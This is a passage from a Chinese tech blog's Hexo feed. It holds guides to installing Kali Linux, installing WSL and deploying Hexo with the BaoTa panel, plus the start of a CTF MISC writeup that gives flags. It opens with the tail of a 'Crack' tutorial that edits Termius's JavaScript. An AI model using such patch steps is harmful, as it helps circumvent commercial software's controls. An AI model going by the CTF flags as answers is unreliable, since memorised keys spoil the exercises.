alt="image-20210519165729354"></p><p>接下来跳转至第二处定位值，注意后面应该有“About”，将这里的<code>vu()</code>改为<code>gu()</code></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519165901693.png" alt="image-20210519165901693"></p><p>参考值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">label</span>:<span class="string">&quot;Check for Update&quot;</span>,<span class="title function_">click</span>(<span class="params"></span>)&#123;<span class="title function_">_u</span>(<span class="string">&quot;menu:check-for-update&quot;</span>)&#125;,<span class="attr">visible</span>:<span class="title function_">vu</span>()&#125;</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">label</span>:<span class="string">&quot;Check for Update&quot;</span>,<span class="title function_">click</span>(<span class="params"></span>)&#123;<span class="title function_">_u</span>(<span class="string">&quot;menu:check-for-update&quot;</span>)&#125;,<span class="attr">visible</span>:<span class="title function_">gu</span>()&#125;</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/05/image-20210519170411325.png" alt="image-20210519170411325"></p><h2 id="总结">总结</h2><p>一定要记得每修改一处代码就要保存，打开程序是否能正常打开。如果你按照上面的方法修改后，就可以愉快的使用Termius了，提示下不要将app文件夹在打包asar文件，打包后貌似不太管用咯！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Crack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Termius </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 2021.1 超详细安装笔记</title>
      <link href="/posts/e4a50494/"/>
      <url>/posts/e4a50494/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>Kali Linux 是基于 Debian 的面向安全的发行版本。该系统由于预安装了上百个知名的安全工具软件而出名。</p><p>Kali 甚至在信息安全领域还有一个含金量较高的认证叫做“Kali 渗透测试”（Pentesting with Kali）认证。该认证的申请者必须在艰难的 24 小时内成功入侵多台计算机，然后另外 24 小时内完成渗透测试报告并发送给 Offensive Security 的安全人员进行评审。成功通过考试的人将会获得 OSCP 认证证书。</p><p>本安装指南及以后的文章主要是为了帮助个人熟悉 Kali Linux 系统和其中一些工具软件的使用。请谨慎使用 Kali 下的工具，因为其中一些工具如果使用不当将会导致计算机系统损坏。请在合法的途径下使用所有 Kali 系列文章中所包含的信息。</p><h2 id="安装准备">安装准备</h2><ul><li>Windows10（或macOS）物理机</li><li>VMware Workstation（或VMware Fusion）</li><li>镜像 <a href="https://www.kali.org/downloads/">kali-linux-2021.1-installer-amd64.iso</a></li></ul><p>本文是基于VMware虚拟机安装Kali Linux，如果你是要直接在物理机上安装，请自行制作U盘启动盘，跳过虚拟机设置部分即可。</p><h2 id="创建新的虚拟机">创建新的虚拟机</h2><p>博主目前使用的Windows系统，故下面教程将全部基于VMware Workstation来安装，mac用户可以参考一下。</p><p>首先，需要打开VMware Workstation（或VMware Fusion）；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201316326.png" alt="image-20210430201316326"></p><p>这里我们选择<code>自定义（高级）</code>，然后选择下一步；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201359700.png" alt="image-20210430201359700"></p><p>如果你需要将创建好的系统复制到其他低版本的VMware机器，可以选择更改硬件兼容性；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201419614.png" alt="image-20210430201419614"></p><p>下面，选择已经下载好的Kali镜像，后选择下一步；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201442704.png" alt="image-20210430201442704"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201534790.png" alt="image-20210430201534790"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201548920.png" alt="image-20210430201548920"></p><p>客户机操作系统选择<code>Linux</code>，版本选择 <code>Debian 10.x 64</code>位；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201608008.png" alt="image-20210430201608008"></p><p>虚拟机名称随便填，我这里就填了Kali Linux，位置是虚拟机文件保存的地方，你可以选择到合适的磁盘路径；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201633131.png" alt="image-20210430201633131"></p><p>处理器配置可以参考我的选择，内核总数一定不能超过物理机CPU内核总数，否则会报错；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201657959.png" alt="image-20210430201657959"></p><p>内存根据你自己的物理机内存合理分配，不建议分配太多，否则运行时物理机会很卡；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201715562.png" alt="image-20210430201715562"></p><p>接下来的保持默认，选择下一步即可；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201728105.png" alt="image-20210430201728105"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201741164.png" alt="image-20210430201741164"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201752984.png" alt="image-20210430201752984"></p><p>下面选择<code>创建新虚拟磁盘</code>后，选择下一步；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201805779.png" alt="image-20210430201805779"></p><p>磁盘容量合理分配即可，建议<strong>至少20GB</strong>，<strong>不要选择</strong>立即分配所有磁盘空间，我这里为了性能选择存储为单个文件，若有复制移动到其他机器的需求，可以选择拆分为多个文件，然后选择下一步；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201850518.png" alt="image-20210430201850518"></p><p>磁盘文件名保持默认即可；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201904773.png" alt="image-20210430201904773"></p><p>选择完成，就可以完成虚拟机的创建了，接下来就开始正式安装了。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430201930223.png" alt="image-20210430201930223"></p><h2 id="正式安装">正式安装</h2><p>先要打开我们创建好的虚拟机；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202015781.png" alt="image-20210430202015781"></p><p>进入虚拟机后，这个我们选择第一个<code>Graphical install</code>后回车；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202121427.png" alt="image-20210430202121427"></p><p>语言建议选择<strong>English</strong>，避免中文出现乱码，你要是选择简体中文问题也不是很大；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202301287.png" alt="image-20210430202301287"></p><p>地区保持默认即可，继续下一步；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202321279.png" alt="image-20210430202321279"></p><p>键盘布局选择Chinese即可；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202421103.png" alt="image-20210430202421103"></p><p>耐心等待…</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202503349.png" alt="image-20210430202503349"></p><p>Hostname是你的计算机主机名，可以保持默认也可以自行修改；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202519415.png" alt="image-20210430202519415"></p><p>域名留空即可；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202528852.png" alt="image-20210430202528852"></p><p>下面填写的是你的用户全名；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202555744.png" alt="image-20210430202555744"></p><p>这个是用户名，首字母必须是小写字母，其余是小写字母和数字的任意组合，不能有大写字母；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202614431.png" alt="image-20210430202614431"></p><p>输入你的用户密码，用于登录系统；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202643592.png" alt="image-20210430202643592"></p><p>等待配置时间地区…</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202651185.png" alt="image-20210430202651185"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202724177.png" alt="image-20210430202724177"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202741461.png" alt="image-20210430202741461"></p><p>磁盘分区我们选择<code>向导-使用整个磁盘</code>即可；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202747712.png" alt="image-20210430202747712"></p><p>直接下一步；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202805124.png" alt="image-20210430202805124"></p><p>这里我们选择<code>将所有文件放在同一个分区</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202819311.png" alt="image-20210430202819311"></p><p>选择<code>结束分区设置并将修改写入磁盘</code>，然后点击继续；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202837146.png" alt="image-20210430202837146"></p><p>这里一定要选择<strong>是</strong>，否则又将回到磁盘分区那里；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202910329.png" alt="image-20210430202910329"></p><p>耐心等待完成基本系统的安装；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430202954921.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430203045050.png" alt="image-20210430203045050"></p><p>桌面布局我们保持默认的Xfce就可以，Xfce和GNOME、KDE不能同时勾选，否则后面安装会卡住；如果你的网络允许可以勾选相关工具包，否则就保持默认就行；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430203136117.png" alt="image-20210430203136117"></p><p>继续等待安装可选的应用…</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430203147096.png" alt="image-20210430203147096"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430203344935.png" alt="image-20210430203344935"></p><p><code>将Grub启动引导器安装至您的主驱动器</code>选择<strong>是</strong>，然后继续；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430204535926.png" alt="image-20210430204535926"></p><p>设备一定要选择**/dev/sda**，然后继续即可。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430204651820.png" alt="image-20210430204651820"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430204827363.png" alt="image-20210430204827363"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430204838221.png" alt="image-20210430204838221"></p><p>点击继续，等待自动重启即可。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210501122405775.png" alt="image-20210501122405775"></p><h2 id="启动系统">启动系统</h2><p>等待5秒即可自动进入，不想等直接回车；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430205341013.png" alt="image-20210430205341013"></p><p>输入你的<strong>用户名</strong>和<strong>密码</strong>就可，注意不是全名；</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430205101439.png" alt="image-20210430205101439"></p><p>下面就是这个炫酷而又熟悉的界面。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210430205010315.png" alt="image-20210430205010315"></p><h2 id="后续">后续</h2><p>关于后续的换源、安装中文输入法、更换Burpsuite为专业版等教程可以继续查看我的博客相关内容。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动安装 Windows 的 Linux子系统</title>
      <link href="/posts/38f2069e/"/>
      <url>/posts/38f2069e/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-启用适用于-Linux-的-Windows-子系统">0x01 启用适用于 Linux 的 Windows 子系统</h2><p>需要先启用“适用于 Linux 的 Windows 子系统”可选功能，然后才能在 Windows 上安装 Linux 分发。</p><p>以<strong>管理员身份</strong>打开 PowerShell 并运行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure><p>建议现在转到步骤 #2，更新到 WSL 2，但如果只想安装 WSL 1，现在可以重新启动计算机，然后继续执行步骤 6。 若要更新到 WSL 2，请等待重新启动计算机，然后继续执行下一步。</p><h2 id="0x02-检查运行-WSL-2-的要求">0x02 检查运行 WSL 2 的要求</h2><p>若要更新到 WSL 2，需要运行 Windows 10。</p><ul><li>对于 x64 系统：<strong>版本 1903</strong> 或更高版本，采用 <strong>内部版本 18362</strong> 或更高版本。</li><li>对于 ARM64 系统：<strong>版本 2004</strong> 或更高版本，采用 <strong>内部版本 19041</strong> 或更高版本。</li><li>低于 18362 的版本不支持 WSL 2。 使用 <a href="https://www.microsoft.com/software-download/windows10">Windows Update 助手</a>更新 Windows 版本。</li></ul><p>若要检查 Windows 版本及内部版本号，选择 Windows 徽标键 + R，然后键入“winver”，选择“确定”。 更新到“设置”菜单中的<a href="ms-settings:windowsupdate">最新 Windows 版本</a>。</p><h2 id="0x03-启用虚拟机功能">0x03 启用虚拟机功能</h2><p>安装 WSL 2 之前，必须启用“虚拟机平台”可选功能。 计算机需要<strong>虚拟化功能</strong>才能使用此功能。</p><p>以<strong>管理员身份</strong>打开 PowerShell 并运行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><p><strong>重新启动</strong> 计算机，以完成 WSL 安装并更新到 WSL 2。</p><h2 id="0x04-下载-Linux-内核更新包">0x04 下载 Linux 内核更新包</h2><ol><li>下载最新包：<ul><li><a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">适用于 x64 计算机的 WSL2 Linux 内核更新包</a></li></ul></li><li>运行上一步中下载的更新包。 （双击以运行 - 系统将提示你提供提升的权限，选择“是”以批准此安装。）</li></ol><p>安装完成后，请继续执行下一步 - 在安装新的 Linux 分发时，将 WSL 2 设置为默认版本。 （如果希望将新的 Linux 安装设置为 WSL 1，请跳过此步骤。）</p><h2 id="0x05-将-WSL-2-设置为默认版本">0x05 将 WSL 2 设置为默认版本</h2><p>打开 PowerShell，然后在安装新的 Linux 发行版时运行以下命令，将 WSL 2 设置为默认版本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="literal">--set-default-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="0x06-安装所选的-Linux-分发版本">0x06 安装所选的 Linux 分发版本</h2><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429143837843.png" alt="image-20210429143837843"></p><ol><li>单击以下链接会打开每个分发版的 Microsoft Store 页面：<ul><li><a href="https://www.microsoft.com/store/apps/9pjn388hp8c9">Ubuntu 16.04 LTS</a></li><li><a href="https://www.microsoft.com/store/apps/9N9TNGVNDL3Q">Ubuntu 18.04 LTS</a></li><li><a href="https://www.microsoft.com/store/apps/9n6svws3rx71">Ubuntu 20.04 LTS</a></li><li><a href="https://www.microsoft.com/store/apps/9NJFZK00FGKV">openSUSE Leap 15.1</a></li><li><a href="https://www.microsoft.com/store/apps/9MZ3D1TRP8T1">SUSE Linux Enterprise Server 12 SP5</a></li><li><a href="https://www.microsoft.com/store/apps/9PN498VPMF3Z">SUSE Linux Enterprise Server 15 SP1</a></li><li><a href="https://www.microsoft.com/store/apps/9PKR34TNCV07">Kali Linux</a></li><li><a href="https://www.microsoft.com/store/apps/9MSVKQC78PK6">Debian GNU/Linux</a></li><li><a href="https://www.microsoft.com/store/apps/9n6gdm4k2hnc">Fedora Remix for WSL</a></li><li><a href="https://www.microsoft.com/store/apps/9NV1GV1PXZ6P">Pengwin</a></li><li><a href="https://www.microsoft.com/store/apps/9N8LP0X93VCP">Pengwin Enterprise</a></li><li><a href="https://www.microsoft.com/store/apps/9p804crf0395">Alpine WSL</a></li></ul></li><li>在分发版的页面中，选择“获取”，随后选择安装。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429143618825.png" alt="image-20210429143618825"></p><p>首次启动新安装的 Linux 分发版时，将打开一个控制台窗口，系统会要求你等待一分钟或两分钟，以便文件解压缩并存储到电脑上。 未来的所有启动时间应不到一秒。</p><p>然后，需要<strong>为新的 Linux 分发版创建用户帐户和密码</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429141826450.png" alt=""></p><p><strong>祝贺你！现已成功安装并设置了与 Windows 操作系统完全集成的 Linux 分发版本！</strong></p><h2 id="安装-Windows-终端（可选）">安装 Windows 终端（可选）</h2><p>Windows 终端可启用多个选项卡（在多个 Linux 命令行、Windows 命令提示符、PowerShell 和 Azure CLI 等之间快速切换）、创建键绑定（用于打开或关闭选项卡、复制粘贴等的快捷方式键）、使用搜索功能，以及使用自定义主题（配色方案、字体样式和大小、背景图像/模糊/透明度）。</p><p><a href="https://aka.ms/terminal">安装 Windows 终端</a>。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20210429143730306.png" alt="image-20210429143730306"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里轻量云使用宝塔面板部署Hexo</title>
      <link href="/posts/38827c73/"/>
      <url>/posts/38827c73/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-说明">0x00 说明</h2><p>该篇文章主要介绍如何利用宝塔BT面板，将Hexo生成的博客自动化部署到你的服务器上。由于一开始没有完整的教程供我参考，在整合了多篇文章后，我将整个流程尽可能简化，也给自己留一个备份，以供之后参考。</p><p>文章的主要内容如下：</p><ol><li>选择Linux系统</li><li>设置SSH登录</li><li>Hexo自动部署</li><li>宝塔面板部署</li></ol><h2 id="0x01-选择VPS以及服务器系统">0x01 选择VPS以及服务器系统</h2><p>由于我还是一枚学生，买不起高性能的服务器，于是就买个轻量云学生机玩玩，如果你追求稳定资金充裕，为了长久的维护博客，建议选择其他可靠的服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/03/20210303215208.png" alt=""></p><p>系统方面我安装的是CentOS  7.3，当然你也可以选择使用Ubuntu/Debian系统，随个人爱好。</p><h2 id="0x02-设置SSH登录">0x02 设置SSH登录</h2><p>完成如下的设置，你可以直接使用你的命令行工具通过SSH来登录你的服务器（建议在代理下使用SSH），而且不需要每次都输入账号密码，如果没有相关需求的同学可以直接跳过这部分。</p><h3 id="生成本地公钥">生成本地公钥</h3><p>首先，我们现在本地生成自己的公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/dqmHjO-cM33Cq.png" alt="dqmHjO-cM33Cq"></p><h3 id="上传你的公钥到服务器">上传你的公钥到服务器</h3><p>然后，将你的公钥<code>/.ssh/id_rsa.pub</code>复制到服务器上对应用户的<code>/.ssh/authorized_keys</code>即可，这里来说一般有以下三种：</p><ol><li><p>如果本地使用macOS，则可以使用 <strong>ssh-copy-id-for-OSX</strong> 工具将公钥复制到服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install ssh-copy-id     <span class="comment">#本地用brew指令安装ssh-copy-id</span></span><br><span class="line">ssh-copy-id username@hostname   <span class="comment">#相应替换为你的服务器用户名和IP</span></span><br></pre></td></tr></table></figure></li><li><p>当服务器用户目录下尚未有.ssh目录时使用此方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/id\_rsa.pub | ssh root@47.100.76.113 <span class="string">&quot;mkdir .ssh; cat &gt; .ssh/authorized\_keys&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>通用方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scp ~/.ssh/id\_rsa.pub username@hostname:~/  <span class="comment">#将公钥文件复制至vps服务器</span></span><br><span class="line">ssh username@hostname                        <span class="comment">#使用用户名和密码方式登录至vps服务器</span></span><br><span class="line"><span class="built_in">mkdir</span> .ssh                      <span class="comment">#若.ssh目录已存在，可省略此步</span></span><br><span class="line"><span class="built_in">cat</span> <span class="built_in">id</span>\_rsa.pub &gt; .ssh/authorized\_keys   <span class="comment">#将公钥文件id_rsa.pub内容追加到authorized_keys文件</span></span><br></pre></td></tr></table></figure><p>注意：其中USERNAME是服务端的用户名称，HOSTNAME是服务器的访问地址。</p></li></ol><h3 id="设置快捷登录">设置快捷登录</h3><p>当完成以上操作后，我们就可以通过在命令行工具中<code>ssh user@hostname</code>登录我们的服务器。当然，还有更简便的方式，省去记录主机名的麻烦，通过在本地编辑<code>.ssh/config</code>设置我们的服务器信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.ssh/config</span><br></pre></td></tr></table></figure><p>添加内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host aliyun<span class="comment">#自定义别名</span></span><br><span class="line">HostName HostName <span class="comment">#替换为你的ssh服务器ip或domain</span></span><br><span class="line">Port port <span class="comment">#ssh服务器端口，默认为22</span></span><br><span class="line">User user <span class="comment">#ssh服务器用户名</span></span><br><span class="line">IdentityFile ~/.ssh/id_rsa <span class="comment">#第一个步骤生成的公钥文件对应的私钥文件 </span></span><br></pre></td></tr></table></figure><p>这样我们就可以通过<code>ssh aliyun</code>的命令行直接快速登录我们的服务器，如果提示<code>&quot;#?\233??\215?为?\240?\232\204ssh?\234\215?\212??\231?ip?\210\226domain&quot;</code>,请删除上面的中文注释，再次重试。</p><h2 id="0x03-Hexo自动部署">0x03 Hexo自动部署</h2><p>Hexo官方论坛提供了多种方式来实现自动部署，该教程使用了<code>git-hook</code>的方式进行部署</p><ol><li>首先，你需要在<strong>服务器</strong>安装<code>git</code>：<br><code>apt-get install git</code></li><li>然后，本地安装部署工具（这个大家都会安装，用来git推送文件）<br><code>npm install hexo-deployer-git --save</code></li><li>接下来，我们要继续在<strong>服务器</strong>上操作，我们要在上面安装一个git的裸仓库，这个仓库里不会存放任何文件，只是一个我们用来接收文件的中转站，当git接收到文件后将其直接存放到我们的指定的文件夹里面。</li></ol><h3 id="配置Git">配置Git</h3><p>接着，我们在<code>/www/wwwroot</code>文件夹下新建hexo文件夹，在hexo文件夹内新建myblog文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /www/wwwroot</span><br><span class="line"><span class="built_in">mkdir</span> hexo</span><br><span class="line"><span class="built_in">cd</span> hexo </span><br><span class="line"><span class="built_in">mkdir</span> myblog</span><br><span class="line">git init --bare hexoBlog.git</span><br><span class="line">vim hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>然后编辑post-receive文件，加入如下两条代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">git --work-tree=/www/wwwroot/hexo/myblog --git-dir=/www/wwwroot/hexo/hexoBlog.git checkout -f</span><br></pre></td></tr></table></figure><p>保存即可，接着转到已经登录的实例控制台，即xshell或者腾讯云控制台执行如下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /www/wwwroot/hexo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>至此，git基本已经配置完成！</p><h2 id="0x04-宝塔面板配置">0x04 宝塔面板配置</h2><p>宝塔面板在「添加站点」输入域名后默认的的网站目录是<code>/www/wwwroot/domain</code>，这与我们的Hexo博客存放地址不符，因此我们需要修改一下</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-81NEU8.png" alt="image-81NEU8"></p><p>将「网站目录」修改为<code>/www/wwwroot/hexo/myblog</code>，PHP版本选择<code>纯静态</code>，点击「保存」</p><h2 id="0x05-本地Hexo配置">0x05 本地Hexo配置</h2><p><strong>找到本地Hexo站点配置文件_config.yml，进行如下更改：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: </span><br><span class="line">    aliyun: root@ip:/www/wwwroot/hexo/hexoBlog.git</span><br><span class="line">    <span class="comment">#如果你更改了ssh端口的话，需要改成:</span></span><br><span class="line">    aliyun: ssh://root@ip:端口号/www/wwwroot/hexo/hexoBlog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h2 id="0x06-总结">0x06 总结</h2><p>至此，利用宝塔BT面板将Hexo博客部署到云服务器上就完成了，enjoy~</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界MISC新手练习区Writeup</title>
      <link href="/posts/36b5b60c/"/>
      <url>/posts/36b5b60c/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200628190929504.png" alt="image-20200628190929504"></p><h2 id="001-this-is-flag">001 this_is_flag</h2><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/FnJuyE.png" alt="FnJuyE"></p><p>【步骤】题目描述就是flag。</p><p><code>flag&#123;th1s_!s_a_d4m0_4la9&#125;</code></p><h2 id="002-pdf">002 pdf</h2><p>【目标】简单密码学</p><p>【环境】windows</p><p>【工具】PDF编辑器</p><p>【分析过程】</p><ul><li><p>打开pdf，猜测flag在图片底下，可以wps等工具编辑PDF，将图片删除或移开后发现flag</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/RlsLjN.png" alt="RlsLjN"></p></li><li><p>得到flag：<code>flag&#123;security_through_obscurity&#125;</code></p></li><li><p>此处附上在线转换地址：<a href="http://app.xunjiepdf.com/pdf2word">http://app.xunjiepdf.com/pdf2word</a></p></li></ul><h2 id="003-如来十三掌">003 如来十三掌</h2><p>【目标】简单密码学</p><p>【环境】windows</p><p>【工具】rot-13</p><p>【分析过程】</p><ol><li>打开附件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/34kQWk.png" alt="34kQWk"></p><p>2.与佛论禅编码解码:<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/04/image-20200628220533426.png" alt="image-20200628220533426"></p><p>得到：<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></p><p>3.Rot13密码解码：<a 